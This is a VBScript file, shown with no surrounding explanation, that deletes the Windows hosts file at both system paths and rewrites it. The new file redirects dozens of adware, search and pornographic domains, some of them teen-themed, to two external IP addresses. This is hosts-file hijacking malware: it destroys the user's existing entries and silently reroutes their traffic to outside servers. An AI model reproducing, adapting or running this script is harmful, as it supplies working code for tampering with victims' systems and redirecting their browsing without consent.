Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists("C:\WINDOWS\hosts") = True Then 
fso.DeleteFile "C:\WINDOWS\hosts", True 
end if 
If fso.FileExists("C:\WINDOWS\system32\drivers\etc\hosts") = True Then 
fso.DeleteFile "C:\WINDOWS\system32\drivers\etc\hosts", True 
end if 
Set f = fso.CreateTextFile("C:\WINDOWS\hosts", ForWriting)
Set g = fso.CreateTextFile("C:\WINDOWS\system32\drivers\etc\hosts", ForWriting)
f.writeline("127.0.0.1  localhost")
g.writeline("127.0.0.1  localhost")
f.writeline("198.65.164.168  00hq.com")
g.writeline("198.65.164.168  00hq.com")
f.writeline("198.65.164.168  8ad.com")
g.writeline("198.65.164.168  8ad.com")
f.writeline("198.65.164.168  searchv.com")
g.writeline("198.65.164.168  searchv.com")
f.writeline("198.65.164.168  www.searchv.com")
g.writeline("198.65.164.168  www.searchv.com")
f.writeline("198.65.164.168  008k.com")
g.writeline("198.65.164.168  008k.com")
f.writeline("198.65.164.168  www.008k.com")
g.writeline("198.65.164.168  www.008k.com")
f.writeline ("198.65.164.170  bis.180solutions.com")
g.writeline ("198.65.164.170  bis.180solutions.com")
f.writeline ("198.65.164.170  bisads.180solutions.com")
g.writeline ("198.65.164.170  bisads.180solutions.com")
f.writeline ("198.65.164.170  www.orbitexplorer.com")
g.writeline ("198.65.164.170  www.orbitexplorer.com")
f.writeline ("198.65.164.170  www.sqwire.com")
g.writeline ("198.65.164.170  www.sqwire.com")
f.writeline ("198.65.164.170  www.traffichog.com")
g.writeline ("198.65.164.170  www.traffichog.com")
f.writeline ("198.65.164.170  www.commonname.com")
g.writeline ("198.65.164.170  www.commonname.com")
f.writeline ("198.65.164.170  allneedsearch.com")
g.writeline ("198.65.164.170  allneedsearch.com")
f.writeline ("198.65.164.170  www.yellow500.com")
g.writeline ("198.65.164.170  www.yellow500.com")
f.writeline ("198.65.164.170  www.008i.com")
g.writeline ("198.65.164.170  www.008i.com")
f.writeline ("198.65.164.170  www.opsex.com")
g.writeline ("198.65.164.170  www.opsex.com")
f.writeline ("198.65.164.170  www.onlysex.ws")
g.writeline ("198.65.164.170  www.onlysex.ws")
f.writeline ("198.65.164.170  www.7days.ws")
g.writeline ("198.65.164.170  www.7days.ws")
f.writeline ("198.65.164.170  www.xsex.ws")
g.writeline ("198.65.164.170  www.xsex.ws")
f.writeline ("198.65.164.170  www.700k.com")
g.writeline ("198.65.164.170  www.700k.com")
f.writeline ("198.65.164.170  www.hotbookmark.com")
g.writeline ("198.65.164.170  www.hotbookmark.com")
f.writeline ("198.65.164.170  www.runsearch.com")
g.writeline ("198.65.164.170  www.runsearch.com")
f.writeline ("198.65.164.170  runsearch.com")
g.writeline ("198.65.164.170  runsearch.com")
f.writeline ("198.65.164.170  www.search-about.net")
g.writeline ("198.65.164.170  www.search-about.net")
f.writeline ("198.65.164.170  go-all.com")
g.writeline ("198.65.164.170  go-all.com")
f.writeline ("198.65.164.170  go-acct.com")
g.writeline ("198.65.164.170  go-acct.com")
f.writeline ("198.65.164.170  get-faster.com")
g.writeline ("198.65.164.170  get-faster.com")
f.writeline ("198.65.164.170  alfaporn.com")
g.writeline ("198.65.164.170  alfaporn.com")
f.writeline ("198.65.164.170  toteen.com")
g.writeline ("198.65.164.170  toteen.com")
f.writeline ("198.65.164.170  www.find-itnow.com")
g.writeline ("198.65.164.170  www.find-itnow.com")
f.writeline ("198.65.164.170  www.mixedporno.com")
g.writeline ("198.65.164.170  www.mixedporno.com")
f.writeline ("198.65.164.170  eliteteensites.com")
g.writeline ("198.65.164.170  eliteteensites.com")
f.Close
g.Close